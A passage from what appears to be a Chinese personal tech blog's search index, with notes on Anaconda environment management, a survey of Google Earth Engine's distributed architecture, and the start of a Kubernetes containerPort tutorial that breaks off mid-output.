Python2 和 Python3 两个环境，来分别运行不同版本的 Python 代码。 conda的环境管理 conda的环境管理功能允许用户同时安装若干个不同版本的python，并能自由切换。\n1、安装一个新环境 比如要安装一个python 3.4环境，需要做如下操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 创建一个名为python34的环境，指定Python版本是3.4（不用管是3.4.x，conda会为我们自动寻找3.4.x中的最新版本） conda create --name python34 python=3.4 # 安装好后，使用activate激活某个环境 conda activate python34 # for Windows source activate python34 # for Linux \u0026amp; Mac # 激活后，会发现terminal输入的地方多了python34的字样，实际上，此时系统做的事情就是把默认2.7环境从PATH中去除，再把3.4对应的命令加入PATH # 此时，再次输入 python --version # 可以得到`Python 3.4.5 :: Anaconda 4.1.1 (64-bit)`，即系统已经切换到了3.4的环境 # 如果想返回默认的python 2.7环境，运行 conda deactivate # for Windows deactivate python34 # for Windows source deactivate python34 # for Linux \u0026amp; Mac # 删除一个已有的环境 conda remove --name python34 --all 如果出现An unexpected error has occurred. Conda has prepared the above report.\nemm vpn没关\n更换conda下载源\n1 2 3 4 conda config --add channels conda-forge conda config --set channel_priority strict conda install jupyterlab-variableinspector #设置之后就不需要在 -c conda-forge 了 2、查看已安装的环境 用户安装的不同python环境都会被放在目录~/anaconda/envs 目录下：\n1 2 3 4 5 6 $ conda info -e # conda environments: # base * /Users/hqs/anaconda3 # 当前被激活的环境会显示一个星号或括号 python27 /Users/hqs/anaconda3/envs/python27 python37 /Users/hqs/anaconda3/envs/python37 Conda包管理 1、查看操作 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 查看当前环境下已安装的包 $ conda list # packages in environment at /Users/hqs/anaconda3: # # Name Version Build Channel _ipyw_jlab_nb_ext_conf 0.1.0 py36_0 alabaster 0.7.12 py36_0 ... ... ... zope.interface 4.6.0 py36h1de35cc_0 zstd 1.3.3 h2a6be3a_0 # 查看某个指定环境的已安装包 $ conda list -n python27 # packages in environment at /Users/hqs/anaconda3/envs/python27: # # Name Version Build Channel ca-certificates 2018.03.07 0 certifi 2018.10.15 py27_0 libcxx 4.0.1 hcfea43d_1 libcxxabi 4.0.1 hcfea43d_1 libedit 3.1.20170329 hb402a30_2 libffi 3.2.1 h475c297_4 ncurses 6.1 h0a44026_0 # 查看package信息 $ conda search numpy Loading channels: done # Name Version Build Channel numpy 1.5.1 py26_0 anaconda/pkgs/free numpy 1.5.1 py26_0 pkgs/free numpy 1.5.1 py26_4 anaconda/pkgs/free ... ... ... 2、包管理操作 Anaconda管理python包。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 安装package conda install pandas # 使用参数安装package conda install -n python37 numpy # 使用-n指定要按照的环境名称 # 不使用-n则按照在当前活跃环境 # -c指定通过某个channel安装 # 更新package conda update pandas conda update -n python37 numpy # 删除package conda remove -n python37 numpy 3、conda管理 conda将conda、python都视为package，因此也可以使用conda来管理conda和python的版本。\n1 2 3 4 5 6 7 8 9 # 更新conda，保持conda最新 $ conda update conda # 更新anaconda $ conda update anaconda # 更新python $ conda update python # 当前环境如果是python 3.7，conda会将Python升级为3.7.x系列当前最新版本 conda和pip安装库之间的区别 conda和pip安装库的区别\n在Anaconda中，无论在哪个环境下，只要通过conda install xxx的方式安装的库都会放在Anaconda的pkgs目录下，如:E:\\python\\anaconda\\pkgs\\numpy-1.18.1-py36h48dd78f_1。这样的好处就是，当在某个环境下已经下载好了某个库，再在另一个环境中还需要这个库时，就可以直接从pkgs目录下将该库复制至新环境（将这个库的Lib\\site-packages中的文件复制到当前新环境下Lib中的第三方库中，也即Lib\\site-packages中，这个过程相当于通过pip install xxx进行了安装）而不用重复下载。\nconda和pip卸载库的区别\npip是在特定的环境中进行库的安装，所以卸载库也是一样的道理，通过pip uninstall xxx就可以将该环境下Lib\\site-packages中对应的库进行卸载了。\n如果通过conda uninstall xxx删除当前环境下某个库时，删除的只是当前环境下site-packages目录中该库的内容，它的效果和通过pip uninstall xxx是一样的。如果再到另一个环境中通过conda install xxx下载这个库，则还是通过将pkgs目录下的库复制到当前环境。若要清空这个pkgs下的已下载库，可以通过命令conda clean -h进行实现。\n","permalink":"https://chance7bin.github.io/posts/note/%E4%BD%BF%E7%94%A8anaconda/","summary":"Anaconda指的是一个开源的python发行版本，其包含了conda、Python等180多个科学包及其依赖项。 Anaconda是一个开","title":"使用Anaconda"},{"content":"1.GEE的产品形态和序列 1.1 GEE基本产品形态 已有的 GIS 云服务通常分为基础云服务（IaaS, Infrastructure as a Service）和 软件云服务（SaaS, Software as a Service）。\n常见的基础云服务有 Google Cloud Platform、百度网盘等，具有较高的可定制性（High level of customizability），但其提供的功能通常局限于数据传输、共享等基础操作。\n常见的软件云服务包括GLOBAL FOREST WATCH、Imazon、CLIMATE ENGINE 等，为特定的研究方向提供数据、技术和高度封装（High level of built-in functionality）的工具，功能丰富，但缺乏灵活性，难以支持多学科领域的交叉研究。\n在此背景下，GEE 建立了一种平台级云服务（PaaS, Platform as a Service），在支持基础云服务的基础上，提供大量已封装的基础 GIS 方法与模型，供用户交互式或代码式调用，以支持复杂 GIS 分析与模拟的定制化操作。\nGEE代码执行流程\n程序运行时，Code Editor 会将编写的代码通过 API 接口发送给 GEE 后台；后台收到代码后，会根据代码逻辑==分配到不同服务器上操作==；显示的逻辑会经过后台计算后返回给编辑器地图界面显示，同时将输出的结果输出到数据报告栏中。通常情况下，运行结果以栅格的方式显示在地图显示区，还可对像素进行信息拾取，但对于一些属性或者统计类的报表信息，只能通过数据报告栏进行查询。同时，程序的运行调试也常常会利用数据报告栏对分步结果进行查看。==数据报告栏还可扩展为独立的 Task Manager 界面，支持任务结果的查询和筛选==。\n1.2 GEE模块序列 GEE 是在 Google 数据中心系列支持技术上所建立的包括 Borg 集群管理系统、Spanner 分布式数据库、谷歌文件系统以及用于并行管道执行的 Flume Java 框架在内的云平台。\n从 GEE 的应用角度考虑，GEE 的模块序列可以分为：\n（1）底层的 Google 数据中心技术支撑，包括分布式数据存储技术、分布式计算技术、瓦片切图技术、并行计算和调度技术等\n（2）中层的资源服务，包括在线公开使用的数据集和用户无感的高性能算。==在分布式高性能计算方面==，GEE 主要是使用了 Google 本身的分布式计算框架，按照 Java Just-In-Time (JIT)策略，将前端代码映射为 Java 程序，在 Flume Java 框架的支持下，实现了分布式的高性能计算。\n（3）高层丰富的编程应用接口。GEE 本身提供了 Explorer 平台，供用户在网页上选择数据、选择计算方法，按照零编程的方式实现影像数据的分析。但此种方式较为局限，无法满足用户的定制式需求，尤其是在用户需要自定义分析算法的情况下。因此，GEE 提供了 Code Editor 平台。在此平台上，用户可以编写==脚本型代码（优化后的 Javascript）==，并且有丰富的示例代码来辅助用户进行开发。除了 Code Editor 这种在线工作模式，GEE 提供了 ==Python 接口==和 ==REST 风格调用接口==，辅助用户在编写 Python 脚本来调用远程的 GEE 服务、编程应用型的Javascript 代码来将 GEE 与 Web 应用相结合。\n（4）与 Google 生态完美融合的应用社区。在以上底层-中层-高层模块框架\n体系的基础上，GEE 与整个 Google 生态进行了整体性的融合。\n1.3 GEE数据生态圈 （1）Earth Engine Data Catalog\nGEE 提供了大量被广泛使用的地理空间数据集供用户在线调用。目前，地理空间数据集包含 700 多种数据，总数据量已经达到 50+ PB，且正以 1 PB/月的速度增长，基本接近实时更新。\n（2）第三方数据 awesome-gee-community-datasets\n一直以来，GEE 的用户都在积极地创建、上传和管理共享数据集。但绝大部分都不会被 GEE 纳入 Data Catalog 中。awesome-gee-community-datasets 填补了这一空白，支持用户将数据提交或推荐至该社区数据集，并在 GEE 中直接调用。\n（3）个人 Cloud Assets\n为支持跨学科复杂地理数据的计算与分析，GEE 积极鼓励用户上传个人数据，并提供了 250G 的默认资源空间（Legacy Assets），该空间中的数据仅与 GEE 账户相关联，不参与 GEE 的云端集成。每个用户仅有一个遗留资源空间。在Google Cloud Platform 的支持下，用户可进一步将数据上传至云端，获取更多的云资源空间（Cloud Assets）。\n此外，基于一种身份与资源管理（Identity and Access Management , IAM）体系，用户可以通过定义谁（身份）对哪些资源具有哪种访问权限（角色）来精细化地管理访问权限。\n1.4 GEE应用生态圈 ==GEE 提供了 JavaScript、Python 和 REST 三种 API 接口，以多样化地支持用户调用服务，从而将复杂的地理空间分析转换为向 GEE 的请求。==\n（1）基于 JavaScript 应用开发，主要是利用 Code Editor 平台，在线编写JavaScript 脚本代码（Google 稍加改进后的 JavaScript 语法），通过在线编程的方式调用 GEE 后台的数据服务和计算服务，获取数据分析的结果。\n用户在 Code Editor 上创建的脚本文件都会拥有一个独立的标识符 ID，可以通过 Publish 的方式来共享链接，其他用户通过点击此链接可以直接访问脚本文集，并且该脚本执行的结果同样会直接共享给其他用户，这种方式又称为==快照Snapshot 模式==。\n（2）基于 Python 应用开发，主要是面向离线型的用户。此处所谓的离线应用，并不是指脱离网络来开发，用户仍然需要联网并能够访问 GEE 的服务；只是编程的环境是离线的，主要是利用 Python 脚本来开发程序。在桌面端的 Python 编程环境中（例如 PyCharm、Spyder、Jupyter 等），可以==通过引入 GEE 的包的形式==，调用 GEE 的功能函数。==这些功能函数仍然会发送到 GEE 的后台服务，经过服务端的计算之后，能够获取相应的结果==。\nGEE 本身也与 Google Cloud Service 联合，通过 ==Colaboratory（简称 colab）平台==能够在线进行 GEE 的 Python 编程。\n（3）基于 REST API 应用开发，主要面向业务应用开发者，需要对网络服务相关知识具有一定的掌握。\n基于 JavaScript的在线 Code Editor 能够帮助用户直接使用 GEE，门槛很低但局限在 Code Editor 平台本身；基于 Python 的 GEE 应用能够与整个 Python 的大生态相融合，形成 Python 语言环境的应用生态；而==基于 REST API 的 GEE 应用==，是在编程的底层构建了统一的访问协议，原则上能够与 C++、C#、Java、VB 等各种编程语言和环境相融合，融入到更加宽广的应用生态圈中。这种策略也是与 Google APP Engine 保持理念一致的。\n在以上 JavaScript、Python、REST API 生态圈的基础上，GEE 还在横向上与一些常用的 GIS 分析工具开展了集成和融合，主要包括：\n（1）GEE 与 QGIS 的集成。QGIS 本身开放有二次开发接口，并提供了 Python 语言的脚本开发环境（类似于 ArcPy）。GEE 与 QGIS 的集成同样是通过 Python 脚本的形式来完成。\n（2）GEE与Jupyter的集成。==GEE 与 Jupyter 的集成构建了一个 geemap 平台==，通过配置 Jupyter 的环境，用户可以利用 Jupyter Notebook 来编写代码，无需依赖于 PyCharm、Spyder 等桌面端的编程 IDE。\n（3）GEE 与 R 工具的集成。GEE 与 R 的集成并不是在底层语言上开展的，而是通过 R 语言来调用 GEE的 Python API。上层编码使用 R 语言，通过 rgee 在内部转换成 Python 的 API，再向 GEE 服务端请求，实现相关功能的调用。\n（4）GEE 与 Julia 平台的集成。GEE 与 Julia 的集成同样是通过调用 GEE 的 Python API 来实现的，具体的技术流程与前述 R 类似。\n2.GEE的技术演化路径及现行技术体系 2.1技术演化路径 2.2现行技术体系 Google Earth Engine 从创建之初就是伴随着 Google 云服务总体布局而发展的，其在数据存储方面直接采用 Google 的分布式存储技术（如 ==BigTable== 等），在文件管理方面采用 Google 文件系统 ==GFS（Google File System）==，在分布式计算方面主要采用 ==Google MapReduce==，在集群管理方面采用 Google 的大规模集群管理系统（如 ==Borg== 等）。在此基础上，GEE 从以下四个层面开展了整体的架构设计：\n（1）数据服务层，主要包括==瓦片化存储服务器==和==用户资源服务器==。瓦片化存储服务器主要是对 GEE 平台中大量的遥感影像数据、地理空间数据按照瓦片的方式进行切片、存储和管理。瓦片化的优势一方面体现在地图显示，按照分块的瓦片来请求数据能够降低网络请求的峰值压力，能够更好的与地图显示相结合；另一方面，==瓦片化后的数据也能够有效的支持并行计算==，尤其是在逐像素计算的相关分析应用，多个同时进行计算最后再合并可以大大提升计算效率。用户资源服务器主要是对 GEE 用户的个人数据进行管理。==通过 GEE 的 Assets 机制==，个人用户可以上传自己的数据，并且可以通过 URL 链接的方式分享自己的数据。\n（2）计算服务层，主要包括==实时计算==和==异步计算==两种模式。实时计算是指用户通过编程接口来调用后台的算法服务，后台直接执行该算法并将结果返回到客户端。实时计算一般是用户地图展示和结果打印（GEE 的 print 函数），这种方式==在计算服务端通过利用 Google 的分布式集群管理、分布式并行计算等技术，极大提升了计算效率==，从而达到所谓“实时”的效果。本质上实时计算和异步计算在服务节点的调用方面并没有大的区别。异步计算主要是按照任务的方式来管理，用户创建任务后无需停留在页面等待，任务计算成功后按照配置的导出（GEE的 Export 函数）实现结果的保存。实时计算和异步计算在形式上的区别主要在于：==实时计算需要在页面等待，关掉页面后 print 的结果就丢失了；异步计算的任务可以在 Task Manager 任务管理器中查看，任务结束后直接保存结果==。\n（3）业务逻辑层，主要是定义了 REST 风格的网络请求接口，并在 REST 网络接口的基础上定义了 JavaScript 和 Python 两种脚本语言的编程接口。GEE 的REST 接口遵循 GET、POST、UPDATE、DELETE 的协议风格，可以通过标准的网络请求协议来驱动后端服务（需通过身份验证）。由于网络编程对于遥感和 GIS 科研工作者而言并不普及，因而在此基础上 GEE 提供了更加易用易懂的脚本编程接口。最为常用的 JavaScript 脚本（Google 稍加了一些语法的改进），在 GEECode Editor 平台上的编程即通过此种脚本。JavaScript 脚本的方式主要是面向在线应用；此外还有针对离线应用的 Python 脚本。在 Python 脚本中同样定义了关于 GEE 的分析方法。\n（4）前台应用层，主要包括了 Code Editor 平台、Explorer 平台和其他第三方网络应用。尤其是 Code Editor 平台，已经成为 GEE 的代表性应用平台。在Code Editor 平台上可以编写分析代码，并将分析应用结果发布成定制式的应用APP。用户可以将自己定制的 APP 发布成公开的网站，并加以推广。此外，一些研究机构和企业也可以基于 GEE 开发形成第三方网络应用。\n2.3数据存储技术——分布式文件系统 分布式文件系统（Distributed file system, DFS）是一种允许文件通过网络在多台主机上分享的文件系统，它主要针对非结构化数据（文件），利用大量的计算机资源来同时完成大量的工作，以获取高性能和高可扩展性。\n2.3.1 Google File System Google File System（GFS、GoogleFS）是 Google 在 2003 年公布的分布式文件系统，它通过大量的普通廉价机器为海量的非结构化数据提供==高性能、高可用性和高扩展性==的分布式数据存储方案。无论在设计理念还是应用规模上，GFS 都是划时代的，但是现在看来 Google 当初的设计充满了简单粗暴。为了简化系统，GFS 仅适用于以下场景：\n（1）文件系统中的文件大（GB 级及以上）而少\n（2）对文件操作多为顺序读取、复写或追加，几乎没有随机访问\n如图 2-2 所示，==一个 GFS 集群由一个管理节点（master）、多个块服务器（chunk server）和多个客户端（client）组成。==GFS 将元数据保存在 master 节点中，将客户端需要的数据分块（chunk）存储在多个 chunk server 中，client 首先访问 master节点，获取 chunk server 信息，再访问相关的 chunk server 完成数据的读写工作。这样的设计方法实现了控制流和数据流的分离，极大的减轻了 master 的负担，同时由于文件被分成多个块（chunk）进行分布式存储， client 可以同时访问多个chunk server，以支持 I/O 可以高度并行。\nChunk server 负责具体的数据存储工作，每个 chunk server 挂载多个磁盘设备并将其格式化为本地文件系统（如 XFS）。在 GFS 中，一个大的文件会被分为多个 chunks，chunk 是数据复制的基本单位，它的大小是固定的(默认是 64MB)。每个 chunk 拥有有全局唯一的文件句柄，它会被复制到多个 chunkserver（默认是3 个）以 Linux 的文件形式存储，以保证数据的可用性和可靠性。\nMaster 承担整个系统控制流枢纽的角色，它维护了所有元数据信息，包括文件命名空间、文件访问控制信息、块（chunk）位置信息和块到 chunkserver 的映射等信息；同时它也控制了整个系统的活动，包括租约（chunk lease）管理、孤儿块（chunk）垃圾回收和块在服务器之间的迁移；单 master 的设计支持系统能使用全局信息进行复杂的块放置和副本决策。然而由于只有一个 master 节点，系统必须尽可能减少 master 节点对读写的参与，优化节点之间的交互，避免 master处的负载过大。\n上图是 GFS 一次写的主要流程，步骤如下：\n（1）client 向 master 询问 chunk 的首要副本和其他副本的位置等信息\n（2）Master 返回首要副本的标识和所有副本的位置，client 缓存该数据\n（3）Client 将数据发送到所有副本\n（4）当所有副本确认收到数据，client 将发送写请求给首要副本\n（5）首要副本转发写请求给所有副本\n（6）所有副本回复首要副本操作结果\n（7）首要副本回复 client，任何副本上的任何错误都会报告给客户端\n2.3.2 HDFS HDFS（Hadoop Distributed File System, Hadoop 分布式文件系统）是 Hadoop项目于 2004 年对 GFS 的开源实现。HDFS 虽然和 GFS 原理相同，但运算速度上达不到 Google 论文中的标准，并且在并发写的处理上，采用了一些简化的做法。尽管如此，==HDFS 算是开源分布式文件系统中最完整实现了 GFS 论文中的概念模型==。Hadoop 也由于其开源特性，使得它成为分布式计算系统事实上的国际标准。\nHDFS 集群由单个 NameNode，和多个 DataNode 构成。NameNode 管理文件系统命名空间的主服务器和管理客户端对文件的访问组成，如打开，关闭和重命名文件和目录。负责管理文件目录、文件和 block 的对应关系以及 block 和DataNode 的对应关系，维护目录树，接管用户的请求。DataNode（数据节点）管理连接到它们运行的节点的存储，负责处理来自文件系统客户端的读写请求，同时还执行块创建，删除。Client(客户端)代表用户通过与 NameNode 和 DataNode交互来访问整个文件系统，HDFS 对外开放文件命名空间并允许用户数据以文件形式存储。用户通过客户端（Client）与 HDFS 进行通讯交互。\nGFS 与 HDFS 的共同点：\n都采用单一主控机+多台工作机的模式，由一台主控机(Master)存储系统全部元数据，并实现数据的分布、复制、备份决策，主控机还实现了元数据的 checkpoint和操作日志记录及回放功能。工作机存储数据，并根据主控机的指令进行数据存储、数据迁移和数据计算等\n都通过数据分块和复制（多副本，一般是 3）来提供更高的可靠性和更高的性能。当其中一个副本不可用时，系统都提供副本自动复制功能。同时，针对数据读多于写的特点，读服务被分配到多个副本所在机器，提供了系统的整体性能\n都提供了一个树结构的文件系统，实现了类似与 Linux 下的文件复制、改名、移动、创建、删除操作以及简单的权限管理等\nGFS 与 HDFS 的不同点：\nGFS 支持多客户端并发 Append 模型，允许文件被多次或者多个客户端同时打开以追加数据；HDFS 文件只允许一次打开并追加数据，客户端先把所有数据写入本地的临时文件中，等到数据量达到一个块的大小（通常为 64MB），再一次性写入 HDFS 文件\nGFS 采用主从模式备份 Master 的系统元数据，当主 Master 失效时，可以通过分布式选举备机接替，继续对外提供服务；而 HDFS 的 Master 的持久化数据只写入到本机，可能采用磁盘镜像作为预防，出现故障时需要人工介入\nGFS 支持数据库快照，而 HDFS 不支持\nGFS 写入数据时，是实时写入到物理块；而 HDFS 是积攒到一定量，才持久化到磁盘\n2.3.3 Colossus 初代 GFS 应用场景十分有限，系统延迟很高，使用时不得不做出各种优化，并且一旦 master 出现问题将会导致严重的后果。因此 2013 年 Google 提出的第二代 GFS——Colossus，新系统拥有分布式元数据管理、1MB 的数据块和理论上无限大的目录规模支持。Colossus 的架构如下：\nScalable Colossus metadata database：分布式元数据管理子系统，但也是整个新系统的核心。==对应原系统的 Master Server==。\nClient Library：应用程序或服务与 Colossus 交互的方式。\nColossus control plane：元数据服务，由许多的 curators 组成。\n“D” managed disk storage: 数据块存储服务器，==对应原系统的 Chunk Server==。\n2.4数据存储技术——分布式数据库 分布式文件系统适用于非结构化数据，且数据都以 key/value 的方式暴力存取。分布式数据库利用计算机网络将物理上分散的多个数据库单元连接起来组成的一个逻辑上统一的数据库。每个被连接起来的数据库单元称为站点或节点。分布式数据库有一个统一的数据库管理系统来进行管理，称为分布式数据库管理系统。\n2.4.1 BigTable BigTable 是 Google 于 2006 年公布的一个分布式结构化数据存储系统，它基于 GFS 构建，但是被设计用来处理海量数据：通常是分布在数千台普通服务器上的 PB 级的数据。\nBigtable 是一个稀疏的、分布式的、持久化存储的多维度排序 Map。即 BigTable 是一个持久化存储的包含海量 key-value 的 Map，这个 Map 按照 Key 进行排序，其中 Key 是一个由{Row Key, Column Key, Timestamp}组成的多维结构，每一行列的组成并不是严格的结构，最终 Map 通过多个分区来实现分布式。\nBigtable 是建立在其它的几个 Google 基础构件之上的。==BigTable 使用 Google 的分布式文件系统（GFS）存储日志文件和数据文件。==BigTable 集群通常运行在一个共享的机器池中，池中的机器还会运行其它的各种各样的分布式应用程序，BigTable 的进程通常要和其它应用的进程共享机器。BigTable 依赖集群管理系统来调度任务、管理共享机器上的资源，处理机器的故障以及监视机器的状态。==BigTable 内部存储数据的文件是 GoogleSSTable 格式的。SSTable 是一个持久化的、排序的、不可更改的 Map 结构。BigTable 还依赖一个高可用的、序列化的分布式锁服务组件，叫做 Chubby==。一个 Chubby 服务包括了 5 个活动的副本，其中的一个副本被选为 Master，并且处理请求。只有在大多数副本都是正常运行的，并且彼此之间能够互相通信的情况下，Chubby 服 务才是可用的。当有副本失效的时候，Chubby 使用 ==Paxos 算法==来保证副本的一致性。\n由上图可知，BigTable 包括了三部分：一个 Master Node、多个 Tablet Server 和 GFS 的支持。Master Node 主要负责以下工作：建立表、为 Tablet Server 分配 Tablets、检测新加入的或者过期失效的 Tablet 服务器、对 Tablet 服务器进行负载均衡、以及对保存在 GFS 上的文件进行垃圾收集。每个 Tablet Server 都管理一个 Tablet 的集合（通常每个服务器有大约数十个至上千个 Tablet）。每个 Tablet 服务器负责处理它所加载的 Tablet 的读写操作，以及在 Tablets 过大时，对其进行分割。一个 BigTable 集群存储了很多表，每个表包含了一个 Tablet 的集合，而每个 Tablet 包含了某个范围内的行的所有相关数据。初始状态 下，一个表只有一个 Tablet。随着表中数据的增长，它被自动分割成多个 Tablet，缺省情况下，每个 Tablet 的尺寸大约是 100MB 到 200MB。\n2.4.2 HBase HBase 是 Hadoop 项目于 2007 年对 BigTable 的开源实现，主要用来存储非结构化和半结构化的松散数据。HBase 非常接近 BigTable，采用了一样的数据模型，将协同服务管理从 ==Chubby 替换成了开源的 Zookeeper，将分布式文件存储系统 GFS 替换成了开源的 HDFS==。\n如上图所示，HBase 架构主要有：客户端、Zookeeper 服务器、Master 服务器、Region 服务器。客户端包含访问 HBase 的接口，同时在缓存中维护着已经访问过的 Region 位置信息，用来加快后续数据访问过程。==Zookeeper 是一个很好的集群管理工具，它可以帮助选举出一个 Master 作为集群的总管，并保证在任何时刻总有唯一一个 Master 在运行，这就避了 Master 的“单点失效”问题==。Master主要负责表和 Region 的管理工作，主要工作有：管理用户对表的增加、删除、修改、查询等操作、实现不同 Region 服务器之间的负载均衡、在 Region 分裂或合并后，负责重新调整 Region 的分布、对发生故障失效的 Region 服务器上的Region 进行迁移等。Region 服务器是 HBase 中最核心的模块，负责维护分配给自己的 Region，并响应用户的读写请求。\n2.4.3 Spanner Spanner 是 Google 于 2012 年公布的全球级分布式数据库，它==冲破了 CAP 原理的枷锁，在可扩展性、可用性、一致性三者之间达到了完美平衡==。Spanner 可以扩展到数百万台机器，数已百计的数据中心，上万亿的行，除了夸张的扩展性之外，它通过同步复制和多版本来满足一致性和可用性。BigTable 精简的数据模型支持用户动态的控制数据的分布和格式，但是对一些复杂的模型而言，很难维护其数据一致性。因此，Spanner 从一个类似 BigTable 的版本化键值存储（versioned key-value store）演进成了一个==多版本时态数据库（temporal multi-version database）==。数据被存储在模型化的半关系型表中；数据被版本化，且每个版本自动按照提交时间标记时间戳；旧版本遵循可配置的垃圾回收策略；应用程序可以读取时间戳较老的数据。Spanner 支持通用的事务，且提供了基于 SQL 的查询语言。\n图 2-13 描述了 Sppanner universe 中的服务器。一个 zone 有一个 zonemaster和几百到几千个 spanserver。前者为 spannerserver 分配数据，后者向客户端提供数据服务。客户端使用每个 zone 的 location proxy 来定位给它分配的为其提供数据服务的 spanserver。universe master 和 placement driver 目前是单例。universe master 主要是一个控制台，其显示了所有 zone 的状态信息，以用来交互式调试。placement driver 分钟级地处理 zone 间的自动化迁移。placement driver 定期与 spanserver 交互来查找需要移动的数据，以满足更新后的副本约束或进行负载均衡。在最底层，每个 spanserver 负责 100 到 1000 个被称为 tablet 的数据结构实例。每个 tablet 都类似于 Bigtable 的 tablet 抽象，其实现了一系列如下的映射：(𝑘𝑒𝑦: 𝑠𝑡𝑟𝑖𝑛𝑔,𝑡𝑖𝑚𝑒𝑠𝑡𝑎𝑚𝑝: 𝑖𝑛𝑡64) → 𝑠𝑡𝑟𝑖𝑛𝑔 。\n==Spannner 为数据分配时间戳，这是 Spanner 更像多版本数据库而不是键值存储的重要原因之一。==\n2.5大数据分析及实时计算技术 2.5.1 MapReduce MapReduce 是 Google 于 2004 年提出的一个处理和生成超大数据集的编程模型，它将海量数据处理的过程拆分为 ==map 和 reduce==。==用户首先创建一个 Map 函数处理一个基于 key/value pair 的数据集合，输出中间的基于 key/value pair 的数据集合；然后再创建一个 Reduce 函数用来合并所有的具有相同中间 key 值的中间 value 值。==基于 MapReduce 的程序能够在大量的普通配置的计算机上实现并行化处理。Map Reduce 在运行时只关心：如何分割输入数据、在大量计算机组成的 集群间的调度、集群中计算机的错误处理、管理集群中计算机之间必要的通信。没有并行计算和分布式处理系统开发经验的程序员可以通过 MapReduce 有效利用分布式系统的丰富资源。\nMapReduce 编程模型在 Google 内部成功应用于多个领域。MapReduce 的优势主要是：==封装了并行处 理、容错处理、数据本地化优化、负载均衡等等技术难点的细节、大量异构数据的解决、实现了一个在数千台计算机组成的大型集群上灵活部署运行的 MapReduce。==\n2.5.2 Spark Spark 是于 2010 年提出的基于内存计算的通用大规模数据处理框架。虽然MapReduce 提供了对数据访问和计算的抽象，但是==对于数据的复用就是简单的将中间数据写到一个稳定的文件系统中，会产生数据的复制备份，磁盘的 I/O 以及数据的序列化，所以在遇到需要在多个计算之间复用中间结果的操作时效率就会非常的低。==后来提出了一个新的模型 RDD，RDD 是一个可以容错且并行的数据结构(其实可以理解成分布式的集合，操作起来和操作本地集合一样简单)，==它可以让用户显式的将中间结果数据集保存在内存中==，并且通过控制数据集的分区来达到数据存放处理最优化。Spark 借鉴了 MapReduce 思想发展而来，保留了其分布式并行计算的优点并改进了其明显的缺陷。==让中间数据存储在内存中提高了运行速度、并提供丰富的操作数据的 API 提高了开发速度==。\nRDD（Resilient Distributed Dataset）叫做弹性分布式数据集，是 Spark 中最基本的数据抽象，它代表一个不可变、可分区、里面的元素可并行计算的集合。RDD 具有数据流模型的特点：自动容错、位置感知性调度和可伸缩性。RDD 允 许用户在执行多个查询时显式地将工作集缓存在内存中，后续的查询能够重用工作集，这极大地提升了查询速度。\n2.6 编排、管理、调度技术 大数据计算都是典型的分布式计算模型，是基于有向无环图（directed acyclic graph，DAG）或者大规模并行处理（massive parallel programming， MPP）迭代的计算模式，这意味着计算任务都是运行时才能生成的，因而难以进行预先调度，而分布式的特点又要求调度系统有更高的灵活性和自适应性。因此为了分布式存储能够高效稳定地运行数万个容器，就需要非常强大的服务编排系统。\n2.6.1 Borg Borg 是 Google 于 2015 年提出的一个集群管理系统，上面运行着十万级的任务，数千个不同的应用，管理着数万台机器。==其通过权限管理、资源共享、性能隔离等来达到高资源利用率。==它能够支持高可用应用，并通过调度策略减少出现故障的概率，提供了任务描述语言、实时任务监控、分析工具等。Borg 主要三大优势：向用户隐藏资源管理和故障处理的细节，用户只需专注于应用程序开发；高可靠性和高可用性的操作，同时支持应用程序相关特性；有效的在数以万计的机器上运行工作负载。\n2.6.2 Kubernetes Kubernetes 是 Google 开源用来管理 Docker 集群的项目，继承了 Borg 的优点，实现了编排、部署、运行以及管理容器应用的目的. Kubernetes 提供资源池化管理，可以将整个集群内的中央处理器（center processing unit，CPU）、图形处理器（graphic processing unit，GPU）、内存、网络和硬盘等资源抽象为一个资源池，可以根据应用的资源需求、资源池中的实时资源情况进行灵活调度；Kubernetes 包含一个统一的调度框架，最多可以管理数千个服务器和数万个容器，同时提供插件化的接口，让第三方来定制和扩展新的调度系统；此外 Kubernetes支持通过 ConfigMap 等方式动态地调整应用配置，从而具备动态调配的基础能力。\n技术层分析 GEE 在技术总体上属于==封闭框架 Close Architecture==，底层严格依赖于 Google云服务，几乎没有办法与其他技术方案相融合。虽然 GEE 近期推出了商业化应用的方案，但仍然需要依托于 Google 云服务的基础框架。如果一个现有应用已经通过微软或者亚马逊的云服务框架开展了数据的云存储和管理，想利用 GEE来集成开展上层应用，目前是没有办法做到的。\nGEE 在表面上属于轻应用、免费的平台，但其后台过于庞大（当然，也是其优势之所在）。在后台与前台之间，并没有明确的业务中台，因而也难以在 GEE平台上扩展新的应用。\n相比而言，我们应当采用==开放架构 Open Architecture==，既支持普通用户的轻便使用，还要支持广大开发者的集成应用，需要与业务开发中广泛采用的技术框架（如Leaflet、Cesium 等前端框架，Hadoop、Spark 等后端框架，Kubernetes、Zookeeper等分布式框架）相集成，具有较高的解耦性和兼容性。\n","permalink":"https://chance7bin.github.io/posts/note/google-earth-engine%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/","summary":"1.GEE的产品形态和序列 1.1 GEE基本产品形态 已有的 GIS 云服务通常分为基础云服务（IaaS, Infrastructure as a Service）和 软件云服务（SaaS, Software as","title":"Google Earth Engine调研报告"},{"content":"pod containerPort containerPort是在pod控制器中定义的，pod中的容器需要暴露的端口，需要暴露什么端口取决于镜像构建时该服务所暴露的端口\n例如，mysql 服务需要暴露 3306 端口，redis 暴露 6379 端口\n如下是一个nginx的deployment.yaml配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 apiVersion: apps/v1 kind: Deployment metadata: name: pc-deployment namespace: dev spec: strategy: # 策略 type: Recreate # 重建更新 replicas: 1 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80\t# 此处定义暴露的端口 启动nginx，通过生成的ip:containerPort进行访问\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [root@clustermaster test]# kubectl apply -f deployment.yaml deployment.apps/pc-deployment created [root@clustermaster test]# kubectl get deploy -n dev NAME READY UP-TO-DATE AVAILABLE AGE pc-deployment 1/1 1 1 14s [root@clustermaster test]# kubectl get pod -n dev NAME READY STATUS RESTARTS AGE pc-deployment-5d89bdfbf9-qnmc8 